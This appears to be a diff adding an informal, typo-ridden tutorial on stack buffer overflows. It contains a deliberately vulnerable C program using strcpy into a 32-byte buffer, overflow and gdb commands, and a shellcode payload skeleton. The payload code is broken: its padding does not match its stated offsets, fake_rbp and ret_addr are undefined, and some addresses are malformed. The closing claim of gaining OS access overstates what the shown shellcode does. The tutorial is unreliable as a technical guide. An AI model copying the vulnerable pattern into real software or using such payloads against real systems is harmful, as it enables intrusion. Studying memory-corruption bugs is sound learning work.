@@ -1,0 +1,79 @@
+warning this is going to be a little mix
+
+
+for this make a c file and use the comand that is in security-sofware 
+run it and run the program 
+
+  #include <stdio.h>                                                                                                                                        
+#include <string.h>
+
+ void funcion(char *input) {                                                                                                                                 
+      char buffer[32];
+      strcpy(buffer, input);                                                                                                                                  
+      printf("Input: %s\n", buffer);                                                                                                                        
+  }
+
+  int main() {
+      char input[100];
+      printf("Dame un input: ");                                                                                                                              
+      fgets(input, 100, stdin);
+      funcion(input);                                                                                                                                         
+      return 0;                                                                                                                                             
+  }
+
+with python first (this is a way to see what we can do)
+
+then we are going to do the testing with python
+$python3 -c "print('A' * 100)" | ./vuln
+
+this is how we are going to see what can happend 
+(@note- this is a simple way)
+
+then we use gdb for make injections in it 
+
+$ gdb ./vuln
+$ run <<< $(python3 -c "print('A' * 100)")
+to see the the reister 
+$ info reister 
+to see the full tack 
+$ x/32x $rsp 
+this will show you exatly on the memory where it fail and what 
+was its value in the memory 
+(rbp is the vulnerable because its the one that store that fail for 
+the number 41 hexadecimal of 'A')
+its important to review hexadecimal 
+
+we fill the buffer 
+we saturate the RBP 
+
+now we can rewrite the RIP 
+
+the faill will show you what in the binary fail and you have to find it sometimes have to be in letter make a close look 
+
+
+so that mean that we can haddle it by waching the binary 
+
+retur addres <- 0x7fffffffe068
+saved RBP <-- value  x7fffffffe050 
+buffer[32] <--- your data goes here x7fffffffe30 
+
+
+char buffer[32];
+read(0,buffer, 100); //accept 100 bytes in a 32 
+
+ read()write secuense in memory :
+  └── bytes 0-31   → buffer[32]  ←normal                             
+  └── bytes 32-39  → saved RBP ← overwrited                     
+  └── bytes 40-47  → return addres ←over writed                    
+  └── bytes 48+    → more than the frame  ← danger zone 
+
+
+the payload in pthon using gdb 
+
+shellcode = b'\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05' #10 bites
+payload = shellcode  #bytes 0-9 -> start of buffer 
+payload += b'A' *2 # bytes 10-31 -> more until we fill the buffer 
+payload += fake_rbp #bytes 32-39 ->overwrite the saved 
+payload += ret_addr #bytes 40-47 overwrite return addres 
+
+and then we will have acces to the os of the victim 
